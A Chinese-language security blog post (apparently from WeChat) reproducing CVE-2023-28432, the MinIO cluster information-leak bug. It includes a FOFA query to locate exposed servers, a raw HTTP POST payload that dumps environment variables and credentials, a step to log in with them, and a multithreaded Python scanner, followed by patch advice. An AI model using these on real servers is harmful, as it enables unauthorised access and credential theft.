#  CVE-2023-28432 MinIO集群模式信息泄露漏洞复现

原创 RCS-TEAM安全团队  [ 小白嘿课 ](javascript:void\(0\);)

**小白嘿课** ![]()

微信号 RCS-TEAM

功能介绍
专注于渗透测试、代码审计、安全开发、安全运维、风险评估、人工智能安全等领域。分享安全知识，提供安全服务，安全招聘，HW、等保、C/C++、数据结构、汇编、安全架构、PC逆向、APP逆向、WAF绕过等。

____

___发表于_

收录于合集

**0x00 团队声明**  

 **该漏洞为我团队漏洞监测平台发现，仅供学习参考使用，请勿用作违法用途，否则后果自负。**  

 **0x01  漏洞概述**

 **漏洞编号： CVE-2023-28432 CNNVD-202303-1795**

MinIO是美国MinIO公司的一款开源的对象存储服务器， 是一款高性能、分布式的对象存储系统. 它是一款软件产品,
可以100%的运行在标准硬件。即X86等低成本机器也能够很好的运行MinIO。MinIO中存在一处信息泄露漏洞，由于Minio集群进行信息交换的9000端口，在未经配置的情况下通过发送特殊HPPT请求进行未授权访问，进而导致MinIO对象存储的相关环境变量泄露，环境变量中包含密钥信息。泄露的信息中包含登录账号密码。

MinIO 存在信息泄露漏洞，该漏洞源于在集群部署中MinIO会返回所有环境变量，导致信息泄露。

 **0x02  影响版本**

2019-12-17T23-16-33Z <= MinIO < RELEASE.2023-03-20T20-16-18Z

 **0x03  漏洞复现**

 **方式一:可以通过FOFA进行搜索，搜索的语法格式如下:  
**

 **title="MinIO Browser"**

![]()

![]()

 **方式二:可以通过Docker容器或Podman等容器复现环境。**

![]()

漏洞存在于API节点 **http://your-ip:9000/minio/bootstrap/v1/verify** 上，通过BP抓包分析。

![]()

构造Payload  

POST /minio/bootstrap/v1/verify HTTP/1.1Host: 192.168.126.128:9000Accept-
Encoding: gzip, deflateAccept: */*Accept-Language: en-US;q=0.9,en;q=0.8User-
Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML,
like Gecko) Chrome/110.0.5481.178 Safari/537.36Connection: closeCache-Control:
max-age=0Content-Type: application/x-www-form-urlencodedContent-Length: 0

![]()

利用泄露的用户名和密码登录系统。

  

![]()

![]()

 **0x04  漏洞检测**

 **基于Python实现的漏洞检测工具  
**

![]()

![]()

 ** **源代码****

# -*- coding: utf-8 -*-from urllib.parse import urlsplitimport argparseimport
requestsimport sysimport reimport threadingfrom requests.exceptions import
RequestExceptionfrom urllib3.exceptions import InsecureRequestWarning  
# 自定义请求头字段headers = {    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64;
x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110
Safari/537.36",    "Accept":
"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8",
"Accept-Language": "en-US,en;q=0.9,zh-CN;q=0.8,zh;q=0.7",    "Content-Type":
"application/x-www-form-urlencoded"}  
data = {    }  
vulurl=[]  
#url合规检测执行def urltest(url):    parsed_url = urlsplit(url)    if
parsed_url.port == "443" and parsed_url.netloc:
url="https://"+parsed_url.netloc+"/minio/bootstrap/v1/verify"
vultest(url)     if parsed_url.netloc and parsed_url.path:
url=parsed_url.scheme+"://"+parsed_url.netloc+"/minio/bootstrap/v1/verify"
vultest(url)    elif parsed_url.netloc:
url=url+"/minio/bootstrap/v1/verify"        vultest(url)    elif (not
parsed_url.scheme) and parsed_url.path:
url_1="http://"+url+"/minio/bootstrap/v1/verify"        vultest(url_1)
url_2="https://"+url+"/minio/bootstrap/v1/verify"        vultest(url_2)
else:        modified_string = re.sub(r"[/\\\\].*",
"/minio/bootstrap/v1/verify", url)        url_1="http://"+modified_string
vultest(url_1)        url_2="https://"+modified_string        vultest(url_2)  
#漏洞检测def vultest(url):    try:        response = requests.post(url, data=data,
headers=headers, verify=False , timeout=3)        parsed_url = urlsplit(url)
url=parsed_url.scheme+"://"+parsed_url.netloc        # 检查响应头的状态码是否为200
if response.status_code == 200 and ("MinioEnv" in response.text):
vulurl.append(url)            print(url+"  [+]漏洞存在！！！")         else:
print(url+"  [-]漏洞不存在。")    except RequestException:        parsed_url =
urlsplit(url)        url=parsed_url.scheme+"://"+parsed_url.netloc
print(url+"  [-]请求失败。")  
  
#读取url或filedef main():    # 禁用警告
requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)
parser = argparse.ArgumentParser(description="读取命令行参数")    group =
parser.add_mutually_exclusive_group(required=True)    group.add_argument('-u',
'--url', help='URL 参数')    group.add_argument('-f', '--file', help='file 参数')
args = parser.parse_args()    if args.url:        urltest(args.url)    elif
args.file:        threads_queue=[]        with open(args.file, 'r') as file:
for line in file:                line=line.strip()                read_thread
= threading.Thread(target=urltest, args=(line,))
threads_queue.append(read_thread)                read_thread.start()
for thread in threads_queue:                thread.join()  
    print("\n存在漏洞列表：")    for url in vulurl:        print(url+"  [+]漏洞存在！！！")  
if __name__ == "__main__":    main()

 ** **  
****

 ** **0x05  整改意见****

升级补丁以修复漏洞，补丁获取链接：  

https://github.com/minio/minio/security/advisories/GHSA-6xvq-wj2x-3h3q

 **~关注我们~**

 ** **~推荐书籍~****

![]()

 **~扫码购书~**

![]()

预览时标签不可点

微信扫一扫  
关注该公众号

[知道了](javascript:;)

微信扫一扫  
使用小程序

****

[取消](javascript:void\(0\);) [允许](javascript:void\(0\);)

****

[取消](javascript:void\(0\);) [允许](javascript:void\(0\);)

： ， 。   视频 小程序 赞 ，轻点两下取消赞 在看 ，轻点两下取消在看

